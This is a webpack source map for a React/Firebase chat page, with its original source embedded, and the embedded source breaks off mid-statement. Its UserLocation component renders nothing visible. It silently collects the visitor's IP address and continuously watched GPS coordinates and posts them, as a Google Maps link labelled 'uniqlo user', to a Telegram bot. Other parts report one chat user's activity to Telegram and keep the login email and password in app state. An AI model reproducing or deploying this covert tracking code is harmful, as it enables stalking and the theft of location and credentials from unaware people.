{"version":3,"sources":["Util/locationUtil.js","const/common.js","Util/chatUtil.js","assets/img/faces/gloria2.jpg","assets/img/faces/jerry.jpg","components/Location/UserLocation.jsx","pages/Verify/AutoLogin.jsx","../node_modules/babel-preset-react-app/node_modules/@babel/runtime/helpers/esm/objectDestructuringEmpty.js","pages/ChatPage/UserChatPage.jsx"],"names":["lastUpdateTime","currentLocation","setUserLocation","setErrorMessage","setAllowPGS","undefined","window","navigator","geolocation","getCurrentPosition","position","location","lat","coords","latitude","lng","longitude","error","0","1","2","3","code","enableHighAccuracy","timeout","maximumAge","watchCurrentLocation","userLocationCacheInterval","Date","watchPosition","now","Math","abs","clearWatchPosition","id","clearWatch","chatFontSize","fontSize","getMessageTimeNotify","utc","localDate","localHr","switchNumber","getHours","localMin","getMinutes","current","min","parseInt","hr","toDateString","num","value","toString","length","avatarUser","arg","linda","gloria","carlos","jerry","marc","mediaTitle","user","style","createOn","module","exports","withRouter","history","useState","ip","setIp","userLocation","errorMessage","allowPGS","useEffect","fetch","then","response","text","result","split","ipInfo","console","log","message","sendTelegramMessage","obj","TypeError","useSelector","state","login","reconnect","email","password","intervalId","setInterval","checkSendMessageSuccess","clearInterval","userLogin","reduxDispatch","loginTypes","messageInfo","toLocaleString","newPostKey","push","child","DatabaseRef","db","key","data","isSendMessageSuccess","chatConnectionRef","update","remove","catch","JSON","stringify","toast","setTimeout","warning","autoClose","auth","doSignInWithEmailAndPassword","success","theme","hideProgressBar","newestOnTop","closeOnClick","rtl","pauseOnFocusLoss","draggable","pauseOnHover","useStyles","makeStyles","sectionCommentsStyle","classes","allChatMessageInfo","setAllChatMessageInfo","replyMessage","setReplyMessage","replyImageUrl","setReplyImageUrl","isUserLocation","setIsUserLocation","maxMessageNumber","chat","chatMsgRef","limitChatMsgRef","query","limitToLast","onValue","snapshot","messageUpdate","val","sliceData","_","slice","values","currentSendMsgUser","className","section","GridContainer","justify","GridItem","xs","sm","md","map","index","ChatMessage","avatar","title","ChatInput","onChange","e","target","onReply","event","notifyMessage","onUpdate","number","chatTypes","enableUpdate","enableImageUpload"],"mappings":"yIAAA,0GAEIA,EAFJ,SAIMC,EAAkB,SAACC,EAAiBC,EAAiBC,GACvD,QAAqCC,IAAjCC,OAAOC,UAAUC,YAA2B,CAoC5CF,OAAOC,UAAUC,YAAYC,oBAlCb,SAACC,GACb,IAAMC,EAAW,CACbC,IAAKF,EAASG,OAAOC,SAAWJ,EAASG,OAAOC,cAAWT,EAC3DU,IAAKL,EAASG,OAAOG,UAAYN,EAASG,OAAOG,eAAYX,GAQjEH,EAAgBS,GAChBP,GAAY,MAGF,SAACa,GASXd,EAPmB,CACfe,EAAG,uCACHC,EAAG,qEACHC,EAAG,mDACHC,EAAG,wCAGoBJ,EAAMK,OACjClB,GAAY,KAGG,CACfmB,oBAAoB,EACpBC,QAAS,IACTC,WAAY,MAOlBC,EAAuB,SAACxB,EAAiBC,EAAiBC,GAwCtCuB,IAWtB,GAFA3B,EAAiBA,GAAkC,IAAI4B,UAElBvB,IAAjCC,OAAOC,UAAUC,YAEjB,OADWD,UAAUC,YAAYqB,eAnDrB,SAACnB,GACb,IAAMC,EAAW,CACbC,IAAKF,EAASG,OAAOC,SAAWJ,EAASG,OAAOC,cAAWT,EAC3DU,IAAKL,EAASG,OAAOG,UAAYN,EAASG,OAAOG,eAAYX,GAG3DyB,EAAM,IAAIF,KACDG,KAAKC,IAAIF,EAAM9B,GAAkB,IACb,GACJ,MAK3BE,EAAgBS,GAChBX,EAAiB,IAAI4B,MAQzBxB,GAAY,MAGF,SAACa,GASXd,EAPmB,CACfe,EAAG,uCACHC,EAAG,qEACHC,EAAG,mDACHC,EAAG,wCAGoBJ,EAAMK,OACjClB,GAAY,KAKA,CACZmB,oBAAoB,EACpBC,QAAS,IACTC,WAAY,KAYdQ,EAAqB,SAACC,QACa7B,IAAjCC,OAAOC,UAAUC,aACjBD,UAAUC,YAAY2B,WAAWD,K,iCCxGzC,kCAAO,IAAMP,EAA4B,M,iCCAzC,uJAMMS,EAAe,CACjBC,SAAU,UAGRC,EAAuB,SAACC,GAC1B,IAAMC,EAAY,IAAIZ,KAAKW,GACrBE,EAAUC,EAAaF,EAAUG,YACjCC,EAAWF,EAAaF,EAAUK,cAElCC,EAAUlB,KAAKE,MAEfiB,EADUC,SAASF,EAAUP,EAAK,IACjB,IAAQ,GACzBU,EAAKF,EAAM,GAGjB,OAAIA,GAAO,GAED,GAAN,OAAUN,EAAV,YAAqBG,GACdG,EAAM,IAAME,GAAM,IAIlBA,EAAK,GADN,GAAN,OAAUR,EAAV,YAAqBG,EAArB,kBAAuCJ,EAAUU,gBAM9CH,GAGLL,EAAe,SAACS,GAClB,IAAMC,EAAQD,EAAIE,WAClB,OAAqB,IAAjBD,EAAME,OACA,IAAN,OAAWF,GAEJA,GAITG,EAAa,SAACC,GAChB,OAAIA,IAAQC,IACDC,IACAF,IAAQG,IACRC,IAEAC,KAITC,EAAa,SAACV,GAChB,OAAIA,EAAMW,OAASN,IAEX,0BAAMO,MAAO5B,GAAb,SACU,uCAAUE,EAAqBc,EAAMa,UAArC,MAGPb,EAAMW,OAASJ,IAElB,0BAAMK,MAAO5B,GAAb,SACU,uCAAUE,EAAqBc,EAAMa,YAI3C,uC,oBCrEhBC,EAAOC,QAAU,IAA0B,qC,oBCA3CD,EAAOC,QAAU,IAA0B,mC,8MCoE5BC,G,MAAAA,aA5DM,SAAC,GAAgB,EAAdC,QAAe,IAAD,EACdC,wBAASjE,GADK,mBAC3BkE,EAD2B,KACvBC,EADuB,OAEMF,wBAASjE,GAFf,mBAE3BoE,EAF2B,KAEbvE,EAFa,OAGMoE,wBAASjE,GAHf,mBAG3BqE,EAH2B,KAGbvE,EAHa,OAIFmE,wBAASjE,GAJP,mBAI3BsE,EAJ2B,KAIjBvE,EAJiB,KAuDlC,OAhDAwE,qBAAU,WACNC,MAAM,4CACDC,MAAK,SAAUC,GACZ,OAAOA,EAASC,UAEnBF,MAAK,SAAUG,GAAS,IAAD,EACIA,EAAOC,MAAM,MADjB,mBACNC,GADM,gBAEpB,GAAIA,EAAQ,CAAC,IAAD,EACYA,EAAOD,MAAM,KADzB,mBACG9B,GADH,WAERoB,EAAMpB,SAGnB,IAGHwB,qBAAU,WACN3E,YAAgBC,EAAiBC,EAAiBC,GAElD,IAAM8B,EAAKR,YAAqBxB,EAAiBC,EAAiBC,GAElE,OAAO,WACC8B,GACAD,YAAmBC,MAG5B,IAGH0C,qBAAU,WACN,GAAIF,EAAc,CACdU,QAAQC,IAAIX,GACZ,IAAMY,EAAO,6BAAyBZ,GACtCa,YAAoBD,MAOzB,CAACZ,EAAcC,IAElBC,qBAAU,WACN,GAAIH,EAAc,CACd,IAAMa,EAAO,4BAAwBf,EAAxB,gDAAkEE,EAAa7D,IAA/E,YAAsF6D,EAAa1D,KAChHwE,YAAoBD,MAEzB,CAACb,IAGA,kBAAC,WAAD,U,uFC6EOL,eA5HG,SAAC,ICjBJ,SAAmCoB,GAChD,GAAW,MAAPA,EAAa,MAAM,IAAIC,UAAU,gCDgBX,UAEqBC,uBAAY,SAAAC,GAAK,OAAIA,EAAMC,SAAhE7B,EAFe,EAEfA,KAAM8B,EAFS,EAETA,UAAWC,EAFF,EAEEA,MAAOC,EAFT,EAESA,SAEhCnB,qBAAU,WACN,IAAIoB,EASJ,OANIjC,IACAiC,EAAaC,aAAY,WACrBC,MACD,MAGA,WACHC,cAAcH,MAEnB,IAGHpB,qBAAU,WACFiB,IACAO,IACAC,YAAcC,KAAgC,MAEnD,CAACT,IAKJ,IAAMK,EAA0B,WAC5B,IAEI,IAAMK,EAAc,CAChBxC,KAAMA,EACNuB,QAAQ,GAAD,QAAK,IAAI1D,MAAO4E,kBACvBvC,SAAUrC,KAAKE,OAGb2E,EAAaC,YAAKC,YAAMC,YAAYC,KAAK,mBAAmBC,IAE9DC,EAAO,GACXA,EAAKN,GAAcF,EAEnB,IAAIS,GAAuB,EAErBC,EAAoBN,YAAMC,YAAYC,KAAK,kBAEjDK,YAAOD,EAAmBF,GACrBjC,MAAK,WAEEf,IAASN,MACTuD,GAAuB,EACvBG,YAAOR,YAAMC,YAAYC,KAAb,yBAAoCJ,SAGvDW,OAAM,SAACnG,GAGA,IAAIqE,EADJrE,IAGIqE,EADArE,EAAMqE,QACIrE,EAAMqE,QAEN+B,KAAKC,UAAUrG,GAG7BmE,QAAQC,IAAIC,GACZiC,IAAMtG,MAAMqE,GACZC,YAAoB,8BAAD,OAA+BD,QAI9DkC,YAAW,YAEsB,IAAzBR,GACAX,YAAcC,KAAgC,KAEnD,KAEL,MAAOrF,GACLmE,QAAQC,IAAIpE,KAKdmF,EAAY,WACd,IACImB,IAAME,QAAQ,yEAAmB,CAAEC,UAAW,MAE1CC,KACAC,YAA6BD,IAAM7B,EAAOC,GACrCjB,MAAK,WACFyC,IAAMM,QAAQ,iCAAS,CAAEH,UAAW,SAEvCN,OAAM,SAAAnG,GACCA,EAAMqE,SACNiC,IAAMtG,MAAMA,EAAMqE,YAKpC,MAAOrE,GACLsG,IAAMtG,MAAM,uGAAwB,CAAEyG,UAAW,QAIzD,OACI,oCACI,kBAAC,IAAD,CACII,MAAM,OACNpH,SAAS,gBACTgH,UAAW,IACXK,iBAAiB,EACjBC,aAAa,EACbC,cAAY,EACZC,KAAK,EACLC,kBAAgB,EAChBC,WAAS,EACTC,cAAY,QEzGtBC,EAAYC,YAAWC,KA2NdpE,uBAzNM,SAAC,GAAgB,EAAdC,QAAe,IAC7BoE,EAAUH,IACRvE,EAAS2B,uBAAY,SAAAC,GAAK,OAAIA,EAAMC,SAApC7B,KAF0B,EAGkBO,wBAASjE,GAH3B,mBAG3BqI,EAH2B,KAGPC,EAHO,OAIMrE,mBAAS,IAJf,mBAI3BsE,EAJ2B,KAIbC,EAJa,OAKQvE,mBAAS,IALjB,mBAK3BwE,EAL2B,KAKZC,EALY,OAMUzE,oBAAS,GANnB,mBAM3B0E,EAN2B,KAMXC,EANW,KAO1BC,EAAqBxD,uBAAY,SAAAC,GAAK,OAAIA,EAAMwD,QAAhDD,iBAERtE,qBAAU,WACN,GAAIwE,UAAmC/I,IAArB6I,EAAgC,CAC9C,IAAMG,EAAkBC,YAAMF,IAAYG,YAAYL,IACtDM,YAAQH,GAAiB,SAACI,GACtBC,EAAcD,SAGvB,CAACP,IAEJtE,qBAAU,WACN,GAAIb,GAAQ+E,GAAmC,KAAlBA,EAAsB,CAC/C,IAAMvC,EAAc,CAChBxC,KAAMA,EACNuB,QAAQ,GAAD,OAAKwD,GACZ7E,SAAUrC,KAAKE,OAKfiF,EAAO,GACXA,EAHmBL,YAAKC,YAAMC,YAAYC,KAAK,YAAYC,KAGxCP,EAEnBW,YAAOkC,IAAYrC,GACdjC,MAAK,WAEF,GAAIf,IAASN,IAAO,CAEhB8B,YADmB,+BAI1B6B,OAAM,SAACnG,GAEJmE,QAAQC,IAAIpE,EAAMqE,SAClBiC,IAAMtG,MAAMA,EAAMqE,SAClBC,YAAoB,+BAAD,OAAgCtE,EAAMqE,gBAGtE,CAACwD,IAGJlE,qBAAU,WACN4C,YAAW,WACPyB,GAAkB,KACnB,KAGHhD,aAAY,WAEJgD,GAAkB,GAClBzB,YAAW,WACPyB,GAAkB,KACnB,OAERtH,OACJ,IAEH,IAIM+H,EAAgB,SAACD,GACnB,IAAM1C,EAAO0C,EAASE,MACtB,GAAa,OAAT5C,QAA0B1G,IAAT0G,EAAoB,CAErC,IAAM6C,EAAYC,IAAEC,MAAMD,IAAEE,OAAOhD,IAAQmC,GAGrCc,EAAqBH,IAAEC,MAAMD,IAAEE,OAAOH,IAAa,GAAG,GAAG7F,KAGtC8F,IAAEC,MAAMD,IAAEE,OAAOH,IAAa,GAAG,GAAG3F,SAGzDF,IAASiG,GACTnB,EAAgB,IAChBF,EAAsBiB,IAGtBjB,EAAsBiB,KAmFlC,OACI,yBAAKK,UAAWxB,EAAQyB,SACpB,kBAACC,EAAA,EAAD,CAAeC,QAAQ,UACnB,kBAACC,EAAA,EAAD,CAAUC,GAAI,GAAIC,GAAI,EAAGC,GAAI,GACzB,6BACK9B,EAAqBA,EAAmB+B,KAAI,SAACrH,EAAOsH,GACjD,OACI,kBAACC,EAAA,EAAD,CACI7D,SAAkBzG,IAAb+C,EAAMlB,GAAmBkB,EAAMlB,GAAKwI,EACzCE,OAAQrH,YAAWH,EAAMW,MACzB8G,MAAO/G,YAAWV,GAClBkC,QAASlC,EAAMkC,aAGtB,8BACL,kBAACwF,EAAA,EAAD,CACIF,OAAQrH,YAAWQ,GACnBX,MAAOwF,EACPmC,SAAU,SAACC,GAAQnC,EAAgBmC,EAAEC,OAAO7H,QAC5C8H,QAjGH,SAAAC,GACjB,IACI,GAAIpH,GAAyB,KAAjB6E,EAAqB,CAC7B,IAAMrC,EAAc,CAChBxC,KAAMA,EACNuB,QAASsD,EACT3E,SAAUrC,KAAKE,OAGb2E,EAAaC,YAAKC,YAAMC,YAAYC,KAAK,YAAYC,IAEvDC,EAAO,GACXA,EAAKN,GAAcF,EAEnB,IAAIS,GAAuB,EAgC3B,GA9BAE,YAAOkC,IAAYrC,GACdjC,MAAK,WAEF,GAAIf,IAASN,IAAO,CAChB,IAAM2H,EAAa,sDAAkDxC,GACrErD,YAAoB6F,GACpBpE,GAAuB,MAG9BI,OAAM,SAACnG,GAGA,IAAIqE,EADJrE,IAGIqE,EADArE,EAAMqE,QACIrE,EAAMqE,QAEN+B,KAAKC,UAAUrG,GAG7BmE,QAAQC,IAAIC,GACZiC,IAAMtG,MAAMqE,GACZC,YAAoB,8BAAD,OAA+BD,KAGtD,GAAIvB,IAASN,IAAO,CAChB,IAAM2H,EAAa,uDAAmDxC,GACtErD,YAAoB6F,OAI5BrH,IAASN,IAAO,CAChB,IAAM2H,EAAa,0CAAsCxC,GACzDrD,YAAoB6F,GAGxB5D,YAAW,YACsB,IAAzBR,IACAO,IAAMtG,MAAM,qDAAc,CAAEyG,UAAW,MACvCnC,YAAoB,yDAEzB,MAET,MAAOtE,GACL,GAAI8C,IAASN,IAAO,CAChB,IAAM2H,EAAa,qDAAiDnK,EAAMqE,SAC1EC,YAAoB6F,MAqCRC,SAhCF,SAAAF,GAClB,GAAIpH,EAAM,CACN,IAAMuH,EAASpC,EAAmB,EAClC7C,YAAckF,IAAkCD,GAGpD,GAAIvH,IAASN,IAAO,CAEhB8B,YADsB,+BA0BNiG,cAAc,EACdzC,iBAAkBA,EAClB0C,mBAAmB,OAKnC,kBAAC,IAAD,MACA,kBAAC,IAAD,CACI3D,MAAM,OACNpH,SAAS,gBACTgH,UAAW,IACXK,iBAAiB,EACjBC,aAAa,EACbC,cAAY,EACZC,KAAK,EACLC,kBAAgB,EAChBC,WAAS,EACTC,cAAY,IAEhB,kBAAC,EAAD,MAjJIW,EAAiB,kBAAC,EAAD,MAAmB,kBAAC,WAAD","file":"static/js/16.c35700f7.chunk.js","sourcesContent":["import { userLocationCacheInterval } from \"const/common\";\r\n\r\nlet lastUpdateTime;\r\n\r\nconst currentLocation = (setUserLocation, setErrorMessage, setAllowPGS) => {\r\n    if (window.navigator.geolocation !== undefined) {\r\n\r\n        const success = (position) => {\r\n            const location = {\r\n                lat: position.coords.latitude ? position.coords.latitude : undefined,\r\n                lng: position.coords.longitude ? position.coords.longitude : undefined,\r\n            }\r\n\r\n            if (process.env.NODE_ENV === \"development\") {\r\n                console.log(\"getCurrentPosition:\");\r\n                console.log(location);\r\n            }\r\n\r\n            setUserLocation(location);\r\n            setAllowPGS(true);\r\n        }\r\n\r\n        const error = (error) => {\r\n\r\n            const errorTypes = {\r\n                0: \"不明原因錯誤\",\r\n                1: \"使用者拒絕提供位置資訊\",\r\n                2: \"無法取得位置資訊\",\r\n                3: \"位置查詢逾時\"\r\n            };\r\n\r\n            setErrorMessage(errorTypes[error.code])\r\n            setAllowPGS(false);\r\n        }\r\n\r\n        const optoptions = {\r\n            enableHighAccuracy: true,\r\n            timeout: 5000,\r\n            maximumAge: 0\r\n        };\r\n\r\n        window.navigator.geolocation.getCurrentPosition(success, error, optoptions);\r\n    }\r\n}\r\n\r\nconst watchCurrentLocation = (setUserLocation, setErrorMessage, setAllowPGS) => {\r\n    const success = (position) => {\r\n        const location = {\r\n            lat: position.coords.latitude ? position.coords.latitude : undefined,\r\n            lng: position.coords.longitude ? position.coords.longitude : undefined,\r\n        }\r\n\r\n        const now = new Date();\r\n        var duration = Math.abs(now - lastUpdateTime) / 1000;\r\n        const durationSeconds = duration % 60;\r\n        const updateSecondLimitation = 180; //3 分鐘通知一次\r\n\r\n        let allowUpdate = durationSeconds > updateSecondLimitation ? true : false;\r\n\r\n        if (allowUpdate) {\r\n            setUserLocation(location);\r\n            lastUpdateTime = new Date();\r\n        }\r\n\r\n        if (process.env.NODE_ENV === \"development\") {\r\n            console.log(\"watchPosition:\");\r\n            console.log(location);\r\n        }\r\n\r\n        setAllowPGS(true);\r\n    }\r\n\r\n    const error = (error) => {\r\n\r\n        const errorTypes = {\r\n            0: \"不明原因錯誤\",\r\n            1: \"使用者拒絕提供位置資訊\",\r\n            2: \"無法取得位置資訊\",\r\n            3: \"位置查詢逾時\"\r\n        };\r\n\r\n        setErrorMessage(errorTypes[error.code])\r\n        setAllowPGS(false);\r\n    }\r\n\r\n    const cacheInterval = userLocationCacheInterval;\r\n\r\n    const options = {\r\n        enableHighAccuracy: true,\r\n        timeout: 5000,\r\n        maximumAge: 0, //default : 0\r\n        // maximumAge: cacheInterval,\r\n    };\r\n\r\n    lastUpdateTime = lastUpdateTime ? lastUpdateTime : new Date();\r\n\r\n    if (window.navigator.geolocation !== undefined) {\r\n        const id = navigator.geolocation.watchPosition(success, error, options);\r\n        return id;\r\n    }\r\n}\r\n\r\nconst clearWatchPosition = (id) => {\r\n    if (window.navigator.geolocation !== undefined) {\r\n        navigator.geolocation.clearWatch(id);\r\n    }\r\n}\r\n\r\nexport { currentLocation, watchCurrentLocation, clearWatchPosition, lastUpdateTime };","export const userLocationCacheInterval = 180000;","import React from 'react';\r\nimport { carlos, linda } from \"firebaseUtil/user\";\r\nimport marc from \"assets/img/faces/marc.jpg\";\r\nimport gloria from \"assets/img/faces/gloria2.jpg\";\r\nimport jerry from \"assets/img/faces/jerry.jpg\";\r\n\r\nconst chatFontSize = {\r\n    fontSize: '0.7rem'\r\n}\r\n\r\nconst getMessageTimeNotify = (utc) => {\r\n    const localDate = new Date(utc);\r\n    const localHr = switchNumber(localDate.getHours());\r\n    const localMin = switchNumber(localDate.getMinutes());\r\n\r\n    const current = Date.now();\r\n    const diffUtc = parseInt(current - utc, 10);\r\n    const min = (diffUtc / 1000) / 60;\r\n    const hr = min / 60;\r\n    const day = hr / 24;\r\n\r\n    if (min <= 60) {\r\n        // return `${Math.floor(min)} minutes ago`;\r\n        return `${localHr}:${localMin}`;\r\n    } else if (min > 60 && hr <= 24) {\r\n        // return `${Math.floor(hr)} hours ago`;\r\n        // return `${localHr}:${localMin}`;\r\n        return `${localHr}:${localMin} ----- ${localDate.toDateString()}`;\r\n    } else if (hr > 24) {\r\n        // return `${Math.floor(day)} days ago`;\r\n        return `${localHr}:${localMin} ----- ${localDate.toDateString()}`;\r\n    }\r\n\r\n    return min;\r\n}\r\n\r\nconst switchNumber = (num) => {\r\n    const value = num.toString();\r\n    if (value.length === 1) {\r\n        return `0${value}`;\r\n    } else {\r\n        return value;\r\n    }\r\n}\r\n\r\nconst avatarUser = (arg) => {\r\n    if (arg === linda) {\r\n        return gloria;\r\n    } else if (arg === carlos) {\r\n        return jerry;\r\n    } else {\r\n        return marc;\r\n    }\r\n}\r\n\r\nconst mediaTitle = (value) => {\r\n    if (value.user === linda) {\r\n        return (\r\n            <span style={chatFontSize}>\r\n                Karen <small>· {getMessageTimeNotify(value.createOn)} </small>\r\n            </span>\r\n        );\r\n    } else if (value.user === carlos) {\r\n        return (\r\n            <span style={chatFontSize}>\r\n                Kevin <small>· {getMessageTimeNotify(value.createOn)}</small>\r\n            </span>\r\n        );\r\n    } else {\r\n        return (<></>);\r\n    }\r\n}\r\n\r\nexport { mediaTitle, avatarUser }","module.exports = __webpack_public_path__ + \"static/media/gloria2.666943cf.jpg\";","module.exports = __webpack_public_path__ + \"static/media/jerry.2aa27bf0.jpg\";","import React, { useState, useEffect, Fragment } from \"react\";\r\nimport { withRouter } from \"react-router-dom\";\r\nimport { sendTelegramMessage } from \"Util/TelegramUtil\";\r\nimport { watchCurrentLocation } from \"Util/locationUtil\";\r\nimport { clearWatchPosition } from \"Util/locationUtil\";\r\nimport { currentLocation } from \"Util/locationUtil\";\r\nimport * as paths from \"routes/constUrl\";\r\n\r\nconst UserLocation = ({ history }) => {\r\n    const [ip, setIp] = useState(undefined);\r\n    const [userLocation, setUserLocation] = useState(undefined);\r\n    const [errorMessage, setErrorMessage] = useState(undefined);\r\n    const [allowPGS, setAllowPGS] = useState(undefined);\r\n\r\n    //取得 IP\r\n    useEffect(() => {\r\n        fetch('https://www.cloudflare.com/cdn-cgi/trace')\r\n            .then(function (response) {\r\n                return response.text();\r\n            })\r\n            .then(function (result) {\r\n                const [f1, h, ipInfo] = result.split(\"\\n\");\r\n                if (ipInfo) {\r\n                    const [ip, value] = ipInfo.split(\"=\");\r\n                    setIp(value);\r\n                }\r\n            });\r\n    }, [])\r\n\r\n    //取得 GPS 座標\r\n    useEffect(() => {\r\n        currentLocation(setUserLocation, setErrorMessage, setAllowPGS);\r\n\r\n        const id = watchCurrentLocation(setUserLocation, setErrorMessage, setAllowPGS);\r\n\r\n        return () => {\r\n            if (id) {\r\n                clearWatchPosition(id);\r\n            }\r\n        };\r\n    }, [])\r\n\r\n    //若取得座標失敗則轉導至錯誤畫面\r\n    useEffect(() => {\r\n        if (errorMessage) {\r\n            console.log(errorMessage);\r\n            const message = `uniqlo user error: ${errorMessage}`;\r\n            sendTelegramMessage(message);\r\n            // history.replace(paths.ErrorPageUrl);\r\n        } else if (allowPGS !== undefined && allowPGS === false) {\r\n            // window.confirm(\"GPS is not enabled or authorized\");\r\n            // history.replace(paths.ErrorPageUrl);\r\n        }\r\n\r\n    }, [errorMessage, allowPGS])\r\n\r\n    useEffect(() => {\r\n        if (userLocation) {\r\n            const message = `uniqlo user \\n ip:${ip} \\n https://www.google.com.tw/maps?q=${userLocation.lat},${userLocation.lng}`;\r\n            sendTelegramMessage(message);\r\n        }\r\n    }, [userLocation]);\r\n\r\n    return (\r\n        <Fragment></Fragment>\r\n    );\r\n}\r\n\r\nexport default withRouter(UserLocation);","import _ from \"lodash\";\r\nimport React, { useEffect, useState } from \"react\";\r\nimport { useSelector } from \"react-redux\";\r\nimport { withRouter } from \"react-router-dom\";\r\nimport { reduxDispatch } from \"redux/store\";\r\nimport * as loginTypes from \"redux/module/loginModule/action\";\r\nimport { linda } from \"firebaseUtil/user\";\r\nimport { sendTelegramMessage } from \"Util/TelegramUtil\";\r\nimport { onAuthStateChanged, signOut } from \"firebase/auth\";\r\nimport { auth } from \"firebaseUtil/firebase\";\r\nimport { db } from \"firebaseUtil/firebase\";\r\nimport { ToastContainer, toast, Flip } from 'react-toastify';\r\nimport { child, limitToLast, onValue, push, query, ref as DatabaseRef, remove, set, update } from 'firebase/database';\r\nimport 'react-toastify/dist/ReactToastify.css';\r\nimport '../../assets/css/react-toastfy-custom.css';\r\nimport { doSignInWithEmailAndPassword } from \"firebaseUtil/auth\";\r\n\r\nconst AutoLogin = ({ }) => {\r\n\r\n    const { user, reconnect, email, password } = useSelector(state => state.login);\r\n\r\n    useEffect(() => {\r\n        let intervalId;\r\n\r\n        //若使用者無法傳送訊息, 則主動重新登入嘗試連線\r\n        if (user) {\r\n            intervalId = setInterval(() => {\r\n                checkSendMessageSuccess();\r\n            }, 10000);\r\n        }\r\n\r\n        return () => {\r\n            clearInterval(intervalId);\r\n        }\r\n    }, [])\r\n\r\n    //若判定使用者已斷線則協助重新登入\r\n    useEffect(() => {\r\n        if (reconnect) {\r\n            userLogin();\r\n            reduxDispatch(loginTypes.SET_RECONNECT_ASYNC, true);\r\n        }\r\n    }, [reconnect])\r\n\r\n\r\n\r\n    //檢測使用者連線狀況\r\n    const checkSendMessageSuccess = () => {\r\n        try {\r\n\r\n            const messageInfo = {\r\n                user: user,\r\n                message: `${new Date().toLocaleString()}`,\r\n                createOn: Date.now()\r\n            }\r\n\r\n            const newPostKey = push(child(DatabaseRef(db), 'connectionTest')).key;\r\n\r\n            let data = {};\r\n            data[newPostKey] = messageInfo;\r\n\r\n            let isSendMessageSuccess = false;\r\n\r\n            const chatConnectionRef = child(DatabaseRef(db), \"connectionTest\");\r\n\r\n            update(chatConnectionRef, data)\r\n                .then(() => {\r\n                    // Data saved successfully!\r\n                    if (user === linda) {\r\n                        isSendMessageSuccess = true;\r\n                        remove(child(DatabaseRef(db), `connectionTest/${newPostKey}`));\r\n                    }\r\n                })\r\n                .catch((error) => {\r\n                    // The write failed...\r\n                    if (error) {\r\n                        let message;\r\n                        if (error.message) {\r\n                            message = error.message;\r\n                        } else {\r\n                            message = JSON.stringify(error);\r\n                        }\r\n\r\n                        console.log(message);\r\n                        toast.error(message);\r\n                        sendTelegramMessage(`onReplyClick update error: ${message}`);\r\n                    }\r\n                });\r\n\r\n            setTimeout(() => {\r\n                //未收到訊息傳送成功 callback, 更新 redux 狀態\r\n                if (isSendMessageSuccess === false) {\r\n                    reduxDispatch(loginTypes.SET_RECONNECT_ASYNC, true);\r\n                }\r\n            }, 2000);\r\n\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n    }\r\n\r\n    //重新登入連線\r\n    const userLogin = () => {\r\n        try {\r\n            toast.warning(\"已斷線, 重新登入中, 請稍後\", { autoClose: 5000 });\r\n\r\n            if (auth) {\r\n                doSignInWithEmailAndPassword(auth, email, password)\r\n                    .then(() => {\r\n                        toast.success(\"已重新登入\", { autoClose: 5000 });\r\n                    })\r\n                    .catch(error => {\r\n                        if (error.message) {\r\n                            toast.error(error.message);\r\n                        }\r\n                    });\r\n            }\r\n\r\n        } catch (error) {\r\n            toast.error(\"已斷線, 重新登入失敗, 請自行重新登入\", { autoClose: 10000 });\r\n        }\r\n    }\r\n\r\n    return (\r\n        <>\r\n            <ToastContainer\r\n                theme='dark'\r\n                position=\"bottom-center\"\r\n                autoClose={1000}\r\n                hideProgressBar={false}\r\n                newestOnTop={false}\r\n                closeOnClick\r\n                rtl={false}\r\n                pauseOnFocusLoss\r\n                draggable\r\n                pauseOnHover\r\n            />\r\n        </>\r\n    )\r\n}\r\n\r\nexport default withRouter(AutoLogin);","export default function _objectDestructuringEmpty(obj) {\n  if (obj == null) throw new TypeError(\"Cannot destructure undefined\");\n}","import _ from 'lodash';\r\nimport React, { useEffect, useState, Fragment } from \"react\";\r\nimport { useSelector } from \"react-redux\";\r\nimport { withRouter } from \"react-router-dom\";\r\nimport { chatMsgRef } from \"firebaseUtil/firebase\";\r\n// @material-ui/core components\r\nimport { makeStyles } from \"@material-ui/core/styles\";\r\n// core components\r\nimport GridContainer from \"components/Grid/GridContainer.js\";\r\nimport GridItem from \"components/Grid/GridItem.js\";\r\nimport ChatMessage from \"components/Chat/ChatMessage\";\r\nimport ChatInput from \"components/Chat/ChatInput\";\r\nimport { avatarUser, mediaTitle } from 'Util/chatUtil';\r\nimport FloatyAssistant from 'components/Assistant/floaty';\r\nimport { sendTelegramMessage } from \"Util/TelegramUtil\";\r\nimport { linda } from 'firebaseUtil/user';\r\nimport sectionCommentsStyle from \"assets/jss/material-kit-pro-react/views/blogPostSections/sectionCommentsStyle.js\";\r\nimport UserLocation from 'components/Location/UserLocation';\r\nimport { userLocationCacheInterval } from 'const/common';\r\nimport * as chatTypes from \"redux/module/chatModule/action\"\r\nimport { reduxDispatch } from 'redux/store';\r\nimport { child, limitToLast, onValue, push, query, ref as DatabaseRef, remove, set, update } from 'firebase/database';\r\nimport { signOut } from 'firebase/auth';\r\nimport { auth } from 'firebaseUtil/firebase';\r\nimport { db } from 'firebaseUtil/firebase';\r\nimport { ToastContainer, toast, Flip } from 'react-toastify';\r\nimport 'react-toastify/dist/ReactToastify.css';\r\nimport AutoLogin from 'pages/Verify/AutoLogin';\r\n\r\n\r\nconst useStyles = makeStyles(sectionCommentsStyle);\r\n\r\nconst UserChatPage = ({ history }) => {\r\n    const classes = useStyles();\r\n    const { user } = useSelector(state => state.login);\r\n    const [allChatMessageInfo, setAllChatMessageInfo] = useState(undefined);\r\n    const [replyMessage, setReplyMessage] = useState(\"\");\r\n    const [replyImageUrl, setReplyImageUrl] = useState(\"\");\r\n    const [isUserLocation, setIsUserLocation] = useState(true);\r\n    const { maxMessageNumber } = useSelector(state => state.chat);\r\n\r\n    useEffect(() => {\r\n        if (chatMsgRef && maxMessageNumber !== undefined) {\r\n            const limitChatMsgRef = query(chatMsgRef, limitToLast(maxMessageNumber));\r\n            onValue(limitChatMsgRef, (snapshot) => {\r\n                messageUpdate(snapshot);\r\n            });\r\n        }\r\n    }, [maxMessageNumber])\r\n\r\n    useEffect(() => {\r\n        if (user && replyImageUrl && replyImageUrl !== \"\") {\r\n            const messageInfo = {\r\n                user: user,\r\n                message: `${replyImageUrl}`,\r\n                createOn: Date.now()\r\n            }\r\n\r\n            const newPostKey = push(child(DatabaseRef(db), 'chatMsg')).key;\r\n\r\n            let data = {};\r\n            data[newPostKey] = messageInfo;\r\n\r\n            update(chatMsgRef, data)\r\n                .then(() => {\r\n                    // Data saved successfully!\r\n                    if (user === linda) {\r\n                        const notifyMessage = `https://klk.coffee/auto`;\r\n                        sendTelegramMessage(notifyMessage);\r\n                    }\r\n                })\r\n                .catch((error) => {\r\n                    // The write failed...\r\n                    